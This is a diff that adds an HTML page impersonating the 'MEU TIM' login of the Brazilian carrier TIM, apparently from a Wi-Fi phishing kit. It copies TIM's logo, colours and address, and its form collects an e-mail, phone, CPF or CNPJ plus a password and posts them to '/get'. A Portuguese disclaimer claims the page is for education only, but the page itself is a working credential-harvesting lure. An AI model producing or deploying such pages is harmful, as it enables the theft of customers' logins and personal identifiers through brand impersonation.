@@ -1,0 +1,203 @@
+<!-- 
+                        A V I S O
+
+Isenção de Responsabilidade: Uso Educacional e Estrutura Legal
+
+As páginas de phishing fornecidas aqui são estritamente destinadas a fins educacionais e de treinamento.
+O objetivo é aumentar a conscientização sobre ameaças de segurança e ensinar os usuários a se proteger contra ataques de phishing.
+Ao acessar essas páginas, você concorda em usá-las apenas dentro de uma estrutura legal e ética, em conformidade com as leis 
+e regulamentos aplicáveis em sua jurisdição.
+
+Limitação de Responsabilidade
+
+O autor desta página se isenta de qualquer responsabilidade pelo uso malicioso ou ilegal dessas páginas de phishing.
+Qualquer pessoa que use essas páginas para fins não conformes à lei será a única responsável por suas ações.
+É altamente recomendável nunca usar essas técnicas para qualquer finalidade que não seja aprendizado e conscientização.
+O autor não monitora o uso dessas páginas após o download e transfere toda a responsabilidade ao usuário após o download.
+-->
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>MEU TIM - Login</title>
+    <link rel="icon"
+        href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2016%2016'%3E%3Ctext%20x='0'%20y='14'%3E🛜%3C/text%3E%3C/svg%3E"
+        type="image/svg+xml" />
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0px;
+            padding: 0px;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #0f00b6;
+        }
+
+        .login-container {
+            width: 90%;
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #e9e9e9;
+            border-radius: 5px;
+            margin-top: 20px;
+            background-color: #fff;
+        }
+        #logo {
+            text-align: center;
+            margin-bottom: 5px;
+
+        }
+        .g-h1 {
+            font-weight: 300;
+            font-size: 24px;
+            margin-top: 5px;
+            text-align: center;
+        }
+        .g-h2 {
+            font-weight: 200;
+            font-size: 16px;
+            margin-top: 10px;
+            text-align: center;
+            color: #D52B1E;
+        }
+        .g-subtitle {
+            font-weight: 200;
+            font-size: 15px;
+            margin-top: 10px;
+            text-align: center;
+            color: #989898;
+        }
+        .g-input {
+            width: calc(100% - 20px);
+            margin-top: 8px;
+            height: 40px;
+            padding: 5px 10px;
+            font-size: 12px;
+            color: #2b2b2b;
+            border: 1px solid #e6ecf0;
+            border-radius: 5px;
+            background-color: #f5f8fa;
+        }
+        .g-comb {
+            width: 100%;
+            margin-top: 15px;
+            height: 40px;
+            padding: 5px 10px;
+            font-size: 12px;
+            color: #14171a;
+            border: 1px solid #e6ecf0;
+            border-radius: 5px;
+            background-color: #f5f8fa;
+        }
+        .g-comb:hover {
+            cursor: pointer;
+        }
+        option {
+            cursor: pointer !important;
+        }
+        label {
+            font-size: 11px;
+            color: rgb(0,38,217);
+            margin-top: 10px;
+            margin-bottom: 5px;
+        }
+        .gbtn-primary {
+            margin-top: 20px;
+            width: 100%;
+            height: 40px;
+            font-size: 13px;
+            color: #fff;
+            background-color: rgb(0,38,217);
+            background-image: linear-gradient(to right, #0f00b6, #2a55cd);
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+        }
+        .gbtn-primary:hover {
+            background-color: rgb(48, 78, 212);
+            background-image: linear-gradient(to right, #2a55cd, #0f00b6);
+        }
+        .gbtn-primary:disabled {
+            background-color: #aab8c2;
+            cursor: not-allowed;
+        }
+        .g-footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #a0a0a0;
+        }
+        .header-banner {
+            width: 100%;
+            max-width: 450px;
+            max-height: 100px;
+            border-radius: 10px;
+        }
+        footer {
+            background-color: #0d293c;
+            height: 300px;
+            color: #fff;
+            padding: 25px 0;
+            text-align: center;
+        }
+        input::placeholder {
+            font-size: 12px;
+            opacity: 0.2;
+            color: #0f00b6;
+        }
+        input:focus {
+            background-color: #c8c8c8;
+            border: 0.1px solid #a9a9a9;
+        }
+ 
+    </style>
+</head>
+
+<body>
+    <div id="header">
+        <div id="login-app">
+            <div class="login-container">
+                <div id="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="136" height="19"><g fill="none" fill-rule="evenodd"><path fill="#004691" d="M37.2 17.23c-1.24-1.179-1.86-2.984-1.86-5.413V.235c0-.088.044-.147.134-.183.089-.034.294-.052.616-.052h.24c.357 0 .59.013.696.04.106.025.16.09.16.195v11.347c0 1.996.459 3.48 1.378 4.452.919.971 2.377 1.457 4.376 1.457 1.98 0 3.425-.49 4.334-1.47.91-.98 1.364-2.46 1.364-4.439V.235c0-.088.05-.147.149-.183.097-.034.307-.052.628-.052h.187c.357 0 .593.013.71.04.115.025.173.09.173.195V11.79c0 2.43-.642 4.238-1.927 5.427C47.274 18.406 45.402 19 42.94 19c-2.587 0-4.5-.59-5.74-1.77M98.418 0c.392 0 .471.052.471 1.397v1.24c0 1.291-.107 1.442-.47 1.442h-4.455v14.514c0 .329-.42.407-1.91.407h-.786c-1.52 0-1.782-.078-1.782-.407V4.079h-4.452c-.367 0-.47-.1-.47-1.442v-1.24c0-1.395.078-1.395.47-1.395L98.418 0zm7.985.406c0-.278-.418-.406-1.86-.406h-.839c-1.515 0-1.777.128-1.777.406v18.187c0 .329.262.407 1.777.407h.84c1.441 0 1.859-.078 1.859-.407V.406zM128.143 0h-1.311c-1.678 0-1.782.178-1.913.458l-2.594 6.028c-.863 2-1.753 4.153-2.095 5.27-.313-1.117-.89-2.612-2.096-5.372l-2.59-5.926c-.157-.354-.813-.458-2.227-.458h-1.465c-1.44 0-1.729.128-1.729.406v18.187c0 .329.29.407 1.782.407h.811c1.465 0 1.887-.078 1.887-.407V7.803h.102s.132.509.343.963l2.985 6.76c.13.304.287.433 1.676.433h.888c1.416 0 1.52-.102 1.65-.432l2.727-6.508c.26-.609.442-1.216.442-1.216h.105v10.79c0 .329.287.407 1.833.407l.789-.003c1.438 0 1.857-.075 1.857-.404V.406c0-.278-.42-.406-1.857-.406z"/><path fill="#DA323E" d="M77.16 4.066H56.623a1.1 1.1 0 01-.774-.322 1.103 1.103 0 01-.315-.773V1.094A1.092 1.092 0 0156.624 0H77.16c.305 0 .58.124.776.327.196.196.316.467.316.767V2.97a1.094 1.094 0 01-1.092 1.095zM64.62 7.467h-7.997a1.08 1.08 0 00-.77.324 1.07 1.07 0 00-.319.77v1.878a1.09 1.09 0 001.089 1.094h7.997V7.467zm13.316.325c-.196-.2-.47-.325-.776-.325h-7.995v4.066h7.995a1.093 1.093 0 001.093-1.095V8.562c0-.298-.12-.572-.317-.77zm0 7.468c-.196-.2-.47-.325-.776-.325h-7.995V19h7.995a1.09 1.09 0 001.093-1.095v-1.877c0-.298-.12-.572-.317-.768zm-13.316-.325h-7.997c-.301 0-.574.125-.77.322-.2.197-.319.47-.319.771v1.877A1.087 1.087 0 0056.624 19h7.996v-4.065z"/><path fill="#004691" d="M.136 18.947C.045 18.913 0 18.851 0 18.763V.263C0 .16.058.09.176.053.295.018.591 0 1.063 0h.082c.381 0 .636.018.764.053a.42.42 0 01.272.21l4.472 8.788a129.06 129.06 0 012.291 4.777c.854-1.97 1.581-3.563 2.181-4.777L15.407.263a.418.418 0 01.273-.21c.126-.035.409-.053.845-.053h.163c.418 0 .686.018.804.053.118.036.178.106.178.21v18.5c0 .105-.054.171-.163.198-.11.025-.347.039-.71.039h-.163c-.328 0-.536-.017-.628-.053-.09-.034-.135-.096-.135-.184v-9.58c0-3.22.017-5.348.054-6.385-.982 2.252-1.754 3.931-2.318 5.04l-3.873 7.626a.284.284 0 01-.204.198c-.1.026-.304.04-.614.04h-.08c-.31 0-.52-.017-.629-.054-.108-.034-.182-.095-.218-.184L4.062 7.837a80.602 80.602 0 01-2.344-5.013c.055 1.707.081 3.844.081 6.412v9.527c0 .105-.054.171-.163.198-.11.025-.346.039-.71.039H.764c-.327 0-.537-.017-.627-.053M21.456 0h11.019c.087 0 .148.044.183.132.035.088.052.273.052.554v.106c0 .281-.017.471-.052.567-.035.097-.096.146-.183.146h-9.183v7.124h7.792c.088 0 .15.044.184.132.034.088.052.273.052.554v.105c0 .282-.018.472-.052.568-.035.097-.096.146-.184.146h-7.792v7.361h9.288c.087 0 .148.045.184.132.034.09.052.274.052.555v.105c0 .282-.018.471-.052.568-.036.097-.097.145-.184.145H21.456V0z"/></g></svg>
+                </div>
+                <center>
+                    <h1 class="g-subtitle">Pra começar, é só inserir suas informações</h1>
+                </center>
+
+                <h2 class="g-h1" style="text-align: left;margin-top: 20px;">Entrar</h2>
+
+                <form action="/get" id="get-usr-pwd" method="post">
+                    <br>
+                    <div class="login-content">
+                        <label>E-mail, Telefone, CPF ou CNPJ</label>
+                        <input name="usr" type="text" class="g-input" placeholder="👤 E-mail, Telefone, CPF ou CNPJ"
+                            required>
+                        <label>Senha</label>
+                        <input name="pwd" type="password" class="g-input" placeholder="🗝️ Senha de acesso"
+                            required>
+                        <div>
+                            <button class="gbtn-primary" type="submit">Acessar</button>
+                        </div>
+                    </div>
+                </form>
+                <div class="g-footer" style="text-justify: auto;text-align: justify;font-size:xx-small;">
+                    <br>
+                    TIM Celular 2015 para reunir as pessoas em casa e curtir jogos online e streamings.
+                    © Tim. Todos os direitos reservados. Endereço: Av. Engenheiro Luis Carlos Berrini, 1070 - Cidade Monções, São Paulo, SP,
+                    Brasil, CEP: 04.571-936
+                </div>
+            </div>
+        </div>
+</body>
+
+</html>
